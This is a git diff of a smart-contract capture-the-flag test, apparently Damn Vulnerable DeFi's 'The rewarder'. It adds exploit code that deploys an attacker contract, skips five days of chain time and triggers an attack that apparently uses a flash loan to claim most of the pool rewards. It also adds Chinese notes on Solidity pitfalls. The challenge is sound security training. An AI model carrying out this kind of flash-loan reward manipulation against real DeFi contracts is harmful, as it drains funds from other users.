@@ -65,7 +65,9 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const rewarderAttacker = await (await ethers.getContractFactory('RewarderAttacker', attacker)).deploy(this.liquidityToken.address, this.rewarderPool.address, this.flashLoanPool.address, this.rewardToken.address);
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await rewarderAttacker.attack(TOKENS_IN_LENDER_POOL)
     });
 
     after(async function () {
@@ -85,16 +87,22 @@ describe('[Challenge] The rewarder', function () {
             let delta = rewards.sub(ethers.utils.parseEther('25'));
             expect(delta).to.be.lt(ethers.utils.parseUnits('1', 16))
         }
-        
+
         // Rewards must have been issued to the attacker account
-        expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
+         expect(await this.rewardToken.totalSupply()).to.be.gt(ethers.utils.parseEther('100'));
         let rewards = await this.rewardToken.balanceOf(attacker.address);
 
         // The amount of rewards earned should be really close to 100 tokens
         let delta = ethers.utils.parseEther('100').sub(rewards);
         expect(delta).to.be.lt(ethers.utils.parseUnits('1', 17));
-
+        
         // Attacker finishes with zero DVT tokens in balance
         expect(await this.liquidityToken.balanceOf(attacker.address)).to.eq('0');
-    });
+    }); 
+
+    
 });
+
+// For 迴圈設定 offset，變成可以分段跑
+// Transfer 要是失敗會直接丟 Error 造成 revert，send 要是對方不收錢會 return 0
+// 一個參數是 calldata, 一個參數是 memory，這會造成原本應該從 calldata 拿資料，造成他從 memory 拿資料
